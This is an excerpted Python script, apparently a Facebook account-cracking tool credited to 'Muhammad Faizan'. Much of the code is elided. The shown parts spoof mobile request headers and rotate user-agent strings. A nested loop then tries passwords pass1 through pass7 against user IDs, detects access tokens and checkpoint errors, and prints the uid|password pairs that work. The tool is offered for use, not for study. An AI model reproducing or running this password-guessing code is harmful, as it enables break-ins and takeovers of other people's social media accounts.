...
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'BlackBerry8910/5.0.0.461 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/612',
...
'Mozilla/5.0 (Danger hiptop 3.3; U; rv:1.7.12) Gecko/20050920',
'Mozilla/5.0 (Linux; Android 10; Pixel) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-US; HTC Build/Android) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36',
...
'Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Karbonn A1+ Duple Build/JDQ39) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 UCBrowser/9.9.2.467 U3/0.8.0 Mobile Safari/533.1',
'LG-LG220C UP.Browser/6.2.3.8 (GUI) MMP/2.0',
'Mozilla/5.0 (Linux; Android 6.0; Micromax Q354 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 YaBrowser/16.7.0.2777.00 Mobile Safari/537.36',
'UCWEB/2.0 (Linux; U; Opera Mini/7.1.32052/30.3697; en-US; DROIDX) U2/1.0.0 UCBrowser/9.3.0.440 Mobile',
...
'Mozilla/5.0 (Linux; Android 11; Nokia 2.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36',}
...
\033[1;96m(~)\033[1;97m Fb     : Muhammad Faizan
...
def login_select():
	...
	print("")
	    ...
	    time.sleep(1)
            ...
            print("\033[1;91mToken invalid or account has Faizi-CP\033[0;97m").center(50)
	...
	print("")
        ...
        if "access_token" in q:
            ...
            if "www.facebook.com" in q["error_msg"]:
                ...
                print ("\n\033[1;91m[!] Login Failed . Account Has a Faizi-CP\033[0;97m")
...
def menu():
    ...
    try:
        ...
        print("login account has Faizi-CP").center(50)
...
def menu_select():
	...
	if select =="2":
		...
		try:
		    ...
		    print("\033[1;91your login account has Faizi-CP").center(50)
		...
		try:
		    ...
		    print("\033[1;91m login id has Faizi-CP").center(50)
	...
	def main(arg):
		...
		try:
		    ...
		    if 'www.facebook.com' in d['error_msg']:
		        ...
		        print("\033[1;96m[Faizi-CP] "+uid+" | "+pass1)
		    	...
		    	if "access_token" in d:
		            ...
		            if 'www.facebook.com' in d['error_msg']:
		                ...
		                print("\033[1;96m[Faizi-CP] "+uid+" | "+pass2)
		                ...
		                if 'access_token' in d:
		                    ...
		                    if 'www.facebook.com' in d['error_msg']:
		                        ...
		                        print("\033[1;96m[Faizi-CP] "+uid+" | "+pass3)
		                        ...
		                        if 'access_token' in d:
		                            ...
		                            if 'www.facebook.com' in d['error_msg']:
		                                ...
		                                print("\033[1;96m[Faizi-CP] "+uid+" | "+pass4)
		                                ...
		                                if 'access_token' in d:
		                                    ...
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        ...
		                                        print("\033[1;96m[Faizi-CP] "+uid+" | "+pass5)
		                                        ...
		                                        if 'access_token' in d:
		                                            ...
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                ...
		                                                print("\033[1;96m[Faizi-CP] "+uid+" | "+pass6)
		                                                ...
		                                                if 'access_token' in d:
		                                                    ...
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        ...
		                                                        print("\033[1;96m[Faizi-CP] "+uid+" | "+pass7)
